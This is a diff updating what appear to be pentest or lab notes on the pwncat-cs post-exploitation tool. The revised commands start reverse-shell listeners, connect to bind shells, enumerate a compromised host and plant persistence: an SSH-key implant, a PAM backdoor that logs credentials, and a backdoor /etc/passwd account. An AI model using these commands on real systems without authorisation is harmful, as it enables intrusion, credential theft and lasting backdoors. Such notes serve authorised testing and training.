@@ -20,13 +20,10 @@ pwncat-cs -lp 4444
 ## Starting a Listener
 
 ```bash
-# TCP listener
+# TCP reverse-shell listener (binds all interfaces; `pwncat-cs :4444` is equivalent)
 pwncat-cs -lp 4444
 
-# Bind to specific interface
-pwncat-cs -lp 4444 --host 0.0.0.0
-
-# Connect to existing bind shell
+# Connect out to an existing bind shell on the target
 pwncat-cs 10.129.14.128:4444
 ```
 
@@ -35,11 +32,11 @@ pwncat-cs 10.129.14.128:4444
 ## Session Navigation
 
 ```bash
-# In remote shell — background and go to local prompt
+# In remote shell — background and drop to the local (pwncat) prompt
 Ctrl+D
 
-# Back to remote shell from local prompt
-(local) connect     # if only one session
+# Back to remote shell from local prompt — the command is `back` (Ctrl+D also toggles)
+(local) back
 (local) sessions    # list sessions
 (local) sessions 0  # interact with session 0
 ```
@@ -65,12 +62,14 @@ Ctrl+D
 ## Built-in Modules
 
 ```bash
-# From local prompt
-(local) run enumerate.system.users   # enumerate users
-(local) run enumerate.system.network # network interfaces
-(local) run enumerate.gather         # run all enumeration
-(local) run implant.ssh              # plant SSH key for persistence
-(local) run persist.cron             # cron persistence
+# From local prompt — enumeration is the `enumerate` module, filtered by type
+(local) run enumerate                       # gather all facts
+(local) run enumerate types=system.network  # just network info
+(local) run enumerate types=user            # users
+# Persistence modules are under linux.implant.* (there is no implant.ssh / persist.cron):
+(local) run linux.implant.authorized_key key=~/.ssh/id_rsa.pub   # SSH key persistence
+(local) run linux.implant.pam                                    # PAM backdoor (log creds)
+(local) run linux.implant.passwd                                 # add backdoor /etc/passwd user
 ```
 
 ---
@@ -97,11 +96,10 @@ stty rows 40 cols 160
 ## Reconnect / Persistence
 
 ```bash
-# pwncat can maintain reconnect scripts
-# From local prompt after implanting SSH key:
-(local) run implant.ssh
+# From local prompt, plant the SSH-key implant:
+(local) run linux.implant.authorized_key key=~/.ssh/id_rsa.pub
 
-# Reconnect via SSH next time
+# Reconnect via SSH next time (pwncat also tracks installed implants for `reconnect`)
 pwncat-cs ssh://user@10.129.14.128
 ```
 
@@ -112,5 +110,5 @@ pwncat-cs ssh://user@10.129.14.128
 ---
 
 *Created: 2026-03-13*
-*Updated: 2026-08-21*
+*Updated: 2026-08-31*
 *Model: claude-opus-5*
